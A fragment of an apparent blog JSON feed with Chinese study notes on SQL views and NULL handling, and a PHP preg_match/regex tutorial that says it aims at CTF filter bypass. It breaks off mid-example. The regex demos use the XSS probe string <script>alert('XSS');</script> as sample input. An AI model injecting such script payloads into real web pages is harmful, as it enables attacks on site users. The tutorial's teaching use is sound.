sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span>  Sno <span class=\"token operator\">is</span> <span class=\"token boolean\">NUll</span> <span class=\"token operator\">or</span> Sname <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Ssex <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Sage <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">or</span> Sdept <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203222101262.png\" alt=\"image-20221203222101262\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>空值的约束条件</p>\n<ul>\n<li>定义为 not null</li>\n<li>unique</li>\n<li>主码</li>\n</ul>\n</li>\n<li>\n<p>空值的运算</p>\n<ul>\n<li>\n<p><code>找出选修了一号课程不及格的学生以及缺考的学生</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC <span class=\"token keyword\">where</span> <span class=\"token punctuation\">(</span>Grade<span class=\"token operator\">&lt;=</span><span class=\"token number\">60</span> <span class=\"token operator\">AND</span> Cno<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span> <span class=\"token punctuation\">(</span>Grade <span class=\"token operator\">is</span> <span class=\"token boolean\">null</span> <span class=\"token operator\">and</span> Cno<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203222726794.png\" alt=\"image-20221203222726794\" /></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"视图\"><a class=\"anchor\" href=\"#视图\">#</a> 视图</h2>\n<p>特点：</p>\n<ul>\n<li>虚表，是从一个或者多个基本表或者视图导出的表</li>\n<li>只能存放视图的定义，不存放对应的数据</li>\n<li>基表中的数据发生变化，从视图中查询出来的数据也发生变化</li>\n</ul>\n<h3 id=\"定义视图\"><a class=\"anchor\" href=\"#定义视图\">#</a> 定义视图</h3>\n<p>语句格式：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> <span class=\"token operator\">&lt;</span>视图名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">AS</span> <span class=\"token operator\">&lt;</span>子查询<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">WITH</span> <span class=\"token keyword\">CHECK</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\"># [WITH CHECK OPTION] 表示对视图进行增删改查操作的时候要保证修改的行满足视图定义中的谓词条件（也就是子查询表达式中的条件）</span></pre></td></tr></table></figure><p>下面三种情况需要指出组成视图的所有列名</p>\n<ul>\n<li>某个目标列不是单纯的属性名，而是聚集函数或者列表达式</li>\n<li>多表连接的时候选出了同名列作为视图的字段</li>\n<li>需要在视图中为某个列启用新的更合适的名字</li>\n</ul>\n<ol>\n<li>\n<p>基于单表</p>\n<ul>\n<li>\n<p><code>创建计算机系学神的视图</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> CS_Student <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203224115912.png\" alt=\"image-20221203224115912\" /></p>\n</li>\n<li>\n<p><code>使得上面的视图在修改时只能加入计算机系的学生</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> CS_Student <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token keyword\">WITH</span> <span class=\"token keyword\">CHECK</span> <span class=\"token keyword\">OPTION</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>\n<p>基于多表</p>\n<ul>\n<li>\n<p><code>建立计算机系选修了一号课程的学生视图</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> SC_Student1 <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> Student<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">,</span>SC <span class=\"token keyword\">where</span> Sdept<span class=\"token operator\">=</span><span class=\"token string\">'CS'</span> <span class=\"token operator\">and</span> Cno<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">and</span> Student<span class=\"token punctuation\">.</span>Sno<span class=\"token operator\">=</span>SC<span class=\"token punctuation\">.</span>Sno<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203225330680.png\" alt=\"image-20221203225330680\" /></p>\n</li>\n</ul>\n</li>\n<li>\n<p>基于视图</p>\n<p><code>建立计算机系选修了1号课程且成绩在90分以上的学生的视图</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> SC_Student2 <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> SC_Student1 <span class=\"token keyword\">where</span> Student<span class=\"token punctuation\">.</span>Grade<span class=\"token operator\">>=</span><span class=\"token number\">90</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>带表达式的视图</p>\n<p><code>定义一个反应学生出生年份的视图</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">VIEW</span> BT_S<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span>Sbirth<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Sname<span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage <span class=\"token keyword\">FROM</span> Student<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203231530346.png\" alt=\"image-20221203231530346\" /></p>\n</li>\n<li>\n<p>分组视图</p>\n<p><code>将学生的学号及他的平均成绩定义为一个视图</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">VIEW</span> S_G<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Gavg<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span><span class=\"token function\">Avg</span><span class=\"token punctuation\">(</span>Grade<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> SC <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Sno<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203231831066.png\" alt=\"image-20221203231831066\" /></p>\n</li>\n<li>\n<p>删除视图</p>\n<p>语句格式：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">VIEW</span> <span class=\"token operator\">&lt;</span>视图名<span class=\"token operator\">></span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>删除视图BT_S</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">VIEW</span> BT_S<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232031229.png\" alt=\"image-20221203232031229\" /></p>\n</li>\n</ol>\n<h3 id=\"查询视图\"><a class=\"anchor\" href=\"#查询视图\">#</a> 查询视图</h3>\n<p>用户角度：查询视图与查询基本表相同</p>\n<p><code>在计算机系学生的视图中找到年龄小于22岁的学生</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">SELECT</span> Sno<span class=\"token punctuation\">,</span>Sage <span class=\"token keyword\">FROM</span> CS_Student <span class=\"token keyword\">WHERE</span> Sage<span class=\"token operator\">&lt;=</span><span class=\"token number\">22</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232531066.png\" alt=\"image-20221203232531066\" /></p>\n<h3 id=\"更新视图\"><a class=\"anchor\" href=\"#更新视图\">#</a> 更新视图</h3>\n<p><code>操作计算机系学生视图CS_Student,并将学号201215122的学生姓名改为“刘辰”</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> CS_Student <span class=\"token keyword\">SET</span> Sname<span class=\"token operator\">=</span><span class=\"token string\">'刘辰'</span> <span class=\"token keyword\">WHERE</span> Sno<span class=\"token operator\">=</span><span class=\"token string\">'201215122'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221203232829223.png\" alt=\"image-20221203232829223\" /></p>\n<h3 id=\"视图的作用\"><a class=\"anchor\" href=\"#视图的作用\">#</a> 视图的作用</h3>\n<ol>\n<li>视图能够简化用户的操作</li>\n<li>视图使用户能以多种角度看待同一数据</li>\n<li>视图对重构数据库提供了一定程度的逻辑独立性</li>\n<li>视图能够对机密数据提供安全保护</li>\n<li>适当的利用视图可以更清晰的表达查询</li>\n</ol>\n",
            "tags": [
                "数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "url": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "title": "preg_match&&正则",
            "date_published": "2022-11-08T16:00:00.000Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h3>\n<p>本篇主要用于记录正则表达式和 preg_match 函数的绕过</p>\n<h3 id=\"preg_match函数\"><a class=\"anchor\" href=\"#preg_match函数\">#</a> preg_match 函数</h3>\n<p>这个函数可以用来进行字符串规则的匹配，这个函数也是在 ctf 中经常会遇到的一个函数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_match</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$pattern</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$subject</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$matches</span>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>preg_match_all () - 执行一个全局正则表达式匹配</p>\n<ul>\n<li>$pattern 是匹配规则</li>\n<li>$subjec 是被匹配的字符串</li>\n<li>$matches 提供一个存放匹配结果的数组</li>\n</ul>\n<p>demo:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108192842127.png\" alt=\"image-20221108192842127\" /></p>\n<h3 id=\"正则表达式\"><a class=\"anchor\" href=\"#正则表达式\">#</a> 正则表达式</h3>\n<p>简单的使用方法，接下来开始聊正则表达式，或许你没写过，但是你肯定用过类似的正则，必然 Linux 中的？* 匹配字符，那么接下来就是无聊的记忆的知识了</p>\n<p>来一个简单的例子</p>\n<p><sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>+abc$</p>\n<ol>\n<li>^ 是匹配输入字符串的位置</li>\n<li>[0-9]+ 是匹配多个数字，[0-9] 匹配一个数字，+ 是匹配一个或者多个。</li>\n<li>abc 匹配字母 abc 并以 abc 结尾，$ 为匹配目标字符串的结束位置</li>\n</ol>\n<h3 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h3>\n<p>首先看一看我们常用到的几个匹配符号</p>\n<ul>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>比如说 ph+p，这里 + 代表前面的 h 至少出现一次，也就是说可以匹配到 php、phhp、phhhp 等等</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph+p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里的 preg_match_all 可以匹配到被匹配字符串的所有符合项，而 preg_match 匹配到第一个就结束了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200557709.png\" alt=\"image-20221108200557709\" /></p>\n</li>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>还是 ph*p 这里是指前面的字符出现任意次，也就是说可以为空，pp、php、phhpd 等等</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph*p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200633268.png\" alt=\"image-20221108200633268\" /></p>\n</li>\n<li>\n<p>？</p>\n<p>可以这里还是 ph?p，这里指可以出现一次或者零次</p>\n<p>，pp、php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph?p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200704240.png\" alt=\"image-20221108200704240\" /></p>\n</li>\n<li>\n<p>[] 用来限制规则，比如说 [a-z] 就是匹配所有的小写字母</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test 129\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-z0-3]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200823705.png\" alt=\"image-20221108200823705\" /></p>\n</li>\n<li>\n<p>{} 用来限制期望字符数，{2-5} 就是指可以有 2-5 个字符长度（这里点不算是一个字符）</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"abaaab\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/a&#123;2&#125;/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200925429.png\" alt=\"image-20221108200925429\" /></p>\n</li>\n<li>\n<p>(.) 用来匹配所有字符，如果项匹配。可以用 []</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/(.)/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108201351042.png\" alt=\"image-20221108201351042\" /></p>\n</li>\n</ul>\n<h3 id=\"普通字符\"><a class=\"anchor\" href=\"#普通字符\">#</a> 普通字符</h3>\n<p>这里的普通字符就是指常见的字符，包括所有大小写字母和数字以及一些符号</p>\n<ol>\n<li>\n<p>上面已经提到 [] 的使用，一般形式匹配 [flag]</p>\n</li>\n<li>\n<p>[^flag] 是指匹配除了 flag 以外的所有字符</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1f2lxz\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[^flag]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108203623635.png\" alt=\"image-20221108203623635\" /></p>\n</li>\n<li>\n<p>单独一个点会匹配出来换行符以外的任何一个字符</p>\n</li>\n<li>\n<p>[\\s\\S] 这里 \\s 是匹配所有空白字符 \\S 是匹配所有的非空白符，不包括换行</p>\n</li>\n<li>\n<p>\\w 这个等价于 [a-zA-Z0-9_]</p>\n</li>\n<li>\n<p>在正则中有一个？使用的很多，这里单独再记录一下</p>\n<p>如果想匹配表单中的内容我们直接写 /&lt;.*&gt;/ 这样会匹配全部内容</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204454412.png\" alt=\"image-20221108204454412\" /></p>\n<p>但是我们如果只想知道都使用了什么标签改怎么办呢，这里就可以只用？</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&lt;h1>&lt;script>alert('XSS');&lt;/script>&lt;/h1>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/&lt;.*?>/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108204606363.png\" alt=\"image-20221108204606363\" /></p>\n</li>\n</ol>\n<h3 id=\"定位符\"><a class=\"anchor\" href=\"#定位符\">#</a> 定位符</h3>\n<ul>\n<li>\n<p>^</p>\n<p>从开头开始匹配</p>\n</li>\n<li>\n<p>$</p>\n<p>匹配到结尾位置，常与 ^ 一起使用只匹配一行</p>\n</li>\n<li>\n<p>\\b</p>\n<p>匹配一个单词的边界</p>\n</li>\n<li>\n<p>\\B</p>\n<p>匹配一个非边界</p>\n</li>\n</ul>\n<p>可能上面简短的几句看起来会很懵，我知道你很急，但你别急，接下来简单的做一些测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^test123/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108213340067.png\" alt=\"image-20221108213340067\" /></p>\n<p>如果待匹配开头没有则不能成功匹配</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td 